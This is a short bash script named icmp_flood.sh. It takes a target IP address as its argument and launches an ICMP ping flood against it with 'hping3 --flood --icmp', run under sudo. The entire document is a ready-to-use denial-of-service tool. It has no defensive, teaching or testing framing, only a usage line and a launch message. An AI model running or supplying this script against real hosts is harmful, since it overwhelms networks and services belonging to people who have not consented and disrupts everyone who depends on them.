#!/bin/bash
#Usage: sudo bash icmp_flood.sh <targe_ip>

if [ -z "$1" ]; then
  echo "Usage: sudo $0 <target_ip>"
  exit 1
fi 

TARGET=$1

echo "[*] Launching ICMP (Ping) flood on $TARGET..."
sudo hping3 --flood --icmp "$TARGET"
